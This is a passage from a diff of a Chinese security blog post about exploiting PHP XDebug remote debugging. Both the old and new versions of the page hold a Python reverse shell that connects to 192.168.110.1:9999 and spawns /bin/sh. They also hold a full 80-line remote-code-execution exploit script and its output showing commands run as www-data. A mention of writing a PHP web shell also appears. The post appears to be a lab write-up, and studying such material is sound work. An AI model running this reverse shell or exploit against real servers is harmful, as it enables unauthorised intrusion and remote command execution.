class="string">&quot;base64&quot;</span>&gt;&lt;![CDATA[cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9u</span><br><span class="line">&gt;&gt; /etc/passwd</span><br><span class="line">b2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAzOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwNDpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA1OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDY6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UK</span><br></pre></td></tr></table></figure>
+
 
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>用python反弹一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.110.1"</span>,<span class="number">9999</span>));os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.110.1&quot;</span>,<span class="number">9999</span>));os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+
+
 
 <h3 id="写木马"><a href="#写木马" class="headerlink" title="写木马"></a>写木马</h3><p>利用base64</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 <p>访问shell.php 可以执行phpinfo()</p>
 <p>这里附上 exp p神的一键脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">1</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_xml</span><span class="params">(sock)</span>:</span></span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span><span class="params">(url)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.get(url + <span class="string">'?XDEBUG_SESSION_START=phpstorm'</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'XDebug remote debug code execution.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, required=<span class="literal">True</span>, help=<span class="string">'the code you want to execute.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-t'</span>, <span class="string">'--target'</span>, required=<span class="literal">True</span>, help=<span class="string">'target url.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-l'</span>, <span class="string">'--listen'</span>, default=<span class="number">9000</span>, type=int, help=<span class="string">'local port'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    ip_port = (<span class="string">'0.0.0.0'</span>, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(<span class="number">10</span>)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(<span class="string">b''</span>.join([<span class="string">b'eval -i 1 -- '</span>, base64.b64encode(args.code.encode()), <span class="string">b'\x00'</span>]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(<span class="string">'[+] Recieve data: '</span> + data.decode())</span><br><span class="line">    g = re.search(r<span class="string">b'&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;'</span>, data, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">        print(<span class="string">'[-] No result...'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    data = g.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">'[+] Result: '</span> + base64.b64decode(data).decode())</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        print(<span class="string">'[-] May be not string result...'</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">1</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_xml</span>(<span class="params">sock</span>):</span></span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span>(<span class="params">url</span>):</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&#x27;local port&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(<span class="number">10</span>)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(args.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">    g = re.search(<span class="string">rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">        print(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    data = g.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        print(<span class="string">&#x27;[-] May be not string result...&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
 
 <p>结果</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\netcat&gt;python3 exp.py -t http://192.168.110.140:8080/index.php -c <span class="string">"shell_exec('id');"</span></span><br><span class="line">[+] Recieve data: &lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">"urn:debugger_protocol_v1"</span> xmlns:xdebug=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="built_in">command</span>=<span class="string">"eval"</span> transaction_id=<span class="string">"1"</span>&gt;&lt;property <span class="built_in">type</span>=<span class="string">"string"</span> size=<span class="string">"54"</span> encoding=<span class="string">"base64"</span>&gt;&lt;![CDATA[dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK]]&gt;&lt;/property&gt;&lt;/response&gt;</span><br><span class="line">[+] Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\netcat&gt;python3 exp.py -t http://192.168.110.140:8080/index.php -c <span class="string">&quot;shell_exec(&#x27;id&#x27;);&quot;</span></span><br><span class="line">[+] Recieve data: &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;iso-8859-1&quot;</span>?&gt;</span><br><span class="line">&lt;response xmlns=<span class="string">&quot;urn:debugger_protocol_v1&quot;</span> xmlns:xdebug=<span class="string">&quot;http://xdebug.org/dbgp/xdebug&quot;</span> <span class="built_in">command</span>=<span class="string">&quot;eval&quot;</span> transaction_id=<span class="string">&quot;1&quot;</span>&gt;&lt;property <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span> size=<span class="string">&quot;54&quot;</span> encoding=<span class="string">&quot;base64&quot;</span>&gt;&lt;![CDATA[dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK]]&gt;&lt;/property&gt;&lt;/response&gt;</span><br><span class="line">[+] Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+
+
 
 <p>参考链接</p>
-<p><a href="https://blog.spoock.com/2017/09/19/xdebug-attack-surface/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/19/xdebug-attack-surface/</a></p>
-<p><a href="https://paper.seebug.org/397/" target="_blank" rel="noopener">https://paper.seebug.org/397/</a></p>
-<p><a href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/" target="_blank" rel="noopener">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</a></p>
-<p><a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py</a></p>
-
-            
-
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.spoock.com/2017/09/19/xdebug-attack-surface/">https://blog.spoock.com/2017/09/19/xdebug-attack-surface/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://paper.seebug.org/397/">https://paper.seebug.org/397/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py<i class="fas fa-external-link-alt"></i></a></p>
 
         </div>
-    </div>
-    <div id="post-footer" class="post-footer main-content-wrap">
+
         
-        
-            <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/24/php-session/"
-                    data-tooltip="php-session"
-                    aria-label="上一篇: php-session"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/23/xxe/"
-                    data-tooltip="xxe"
-                    aria-label="下一篇: xxe"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：xdebug</li>
+        <li>Post author：p1k</li>
+        <li>Create time：2019-09-24 15:19:05</li>
+        <li>
+            Post link：http://p1keman.github.io/2019/09/24/xdebug/
         </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/24/xdebug/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/24/xdebug/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/24/xdebug/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
         </li>
     </ul>
 </div>
 
+            </div>
+        
 
         
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/09/24/php-session/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">php-session</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/09/23/xxe/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">xxe</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
         
-            
+
         
     </div>
-</article>
+</div>
 
 
+                
+            </div>
 
-                <footer id="footer" class="main-content-wrap">
-    <span class="copyrights">
-        Copyrights &copy; 2020 John Doe. All Rights Reserved.
-    </span>
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
 </footer>
 
-            </div>
-            
-                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
-                    <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/24/php-session/"
-                    data-tooltip="php-session"
-                    aria-label="上一篇: php-session"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/23/xxe/"
-                    data-tooltip="xxe"
-                    aria-label="下一篇: xxe"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
         
-            
-            
